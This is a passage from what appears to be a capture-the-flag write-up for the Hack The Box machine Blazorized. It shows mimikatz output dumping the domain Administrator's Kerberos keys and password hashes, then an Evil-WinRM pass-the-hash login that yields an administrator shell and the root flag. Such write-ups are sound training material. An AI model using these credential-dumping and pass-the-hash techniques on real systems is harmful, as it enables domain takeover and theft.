    lm  - 5: ece3bdafb6211176312c1db3d723ede8
    lm  - 6: 1ccc6a1cd3c3e26da901a8946e79a3a5
    lm  - 7: 8b3c1950099a9d59693858c00f43edaf
    lm  - 8: a14ac624559928405ef99077ecb497ba

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 36ff197ab8f852956e4dcbbe85e38e17
* Primary:Kerberos-Newer-Keys *
    Default Salt : BLAZORIZED.HTBAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 29e501350722983735f9f22ab55139442ac5298c3bf1755061f72ef5f1391e5c
      aes128_hmac       (4096) : df4dbea7fcf2ef56722a6741439a9f81
      des_cbc_md5       (4096) : 310e2a0438583dce
    OldCredentials
      aes256_hmac       (4096) : eeb59c1fa73f43372f40f4b0c9261f30ce68e6cf0009560f7744d8871058af2c
      aes128_hmac       (4096) : db4d9e0e5cd7022242f3e03642c135a6
      des_cbc_md5       (4096) : 1c67ef730261a198
    OlderCredentials
      aes256_hmac       (4096) : bb7fcd1148a3863c9122784becf13ff7b412af7d734162ed3cb050375b1a332c
      aes128_hmac       (4096) : 2d9925ef94916523b24e43d1cb8396ee
      des_cbc_md5       (4096) : 9b01158c8923ce68
* Primary:Kerberos *
    Default Salt : BLAZORIZED.HTBAdministrator
    Credentials
      des_cbc_md5       : 310e2a0438583dce
    OldCredentials
      des_cbc_md5       : 1c67ef730261a198
* Packages *
    NTLM-Strong-NTOWF
* Primary:WDigest *
    01  7e35fe37aac9f26cecc30390171b6dcf
    02  a8710c4caaab28c0f2260e7c7bd3b262
    03  81eae4cf7d9dadff2073fbf2d5c60539
    04  7e35fe37aac9f26cecc30390171b6dcf
    05  9bc0a87fd20d42df13180a506db93bb8
    06  26d42d164b0b82e89cf335e8e489bbaa
    07  d67d01da1b2beed8718bb6785a7a4d16
    08  7f54f57e971bcb257fc44a3cd88bc0e3
    09  b3d2ebd83e450c6b0709d11d2d8f6aa8
    10  1957f9211e71d307b388d850bdb4223f
    11  2fa495bdf9572e0d1ebb98bb6e268b01
    12  7f54f57e971bcb257fc44a3cd88bc0e3
    13  de0bba1f8bb5b81e634fbaa101dd8094
    14  2d34f278e9d98e355b54bbd83c585cb5
    15  06b7844e04f68620506ca4d88e51705d
    16  97f5ceadabcfdfcc019dc6159f38f59e
    17  ed981c950601faada0a7ce1d659eba95
    18  cc3d2783c1321d9d2d9b9b7170784283
    19  0926e682c1f46c007ba7072444a400d7
    20  1c3cec6d41ec4ced43bbb8177ad6e272
    21  30dcd2ebb2eda8ae4bb2344a732b88f9
    22  b86556a7e9baffb7faad9a153d1943c2
    23  c6e4401e50b8b15841988e4314fbcda2
    24  d64d0323ce75a4f3dcf0b77197009396
    25  4274d190e7bc915d4047d1a63776bc6c
    26  a04215f3ea1d2839a3cdca4ae01e2703
    27  fff4b2817f8298f09fd45c3be4568ab1
    28  2ea3a6b979470233687bd913a8234fc7
    29  73d831d131d5e67459a3949ec0733723

mimikatz(commandline) # exit
Bye!

```

This gives the NTLM hash of the administrator account.

### Shell

Evil-WinRM will get a shell as administrator:

```

oxdf@hacky$ evil-winrm -i blazorized.htb -u administrator -H f55ed1465179ba374ec1cad05b34a5f3
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And I can grab `root.txt`:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
4712105c************************

```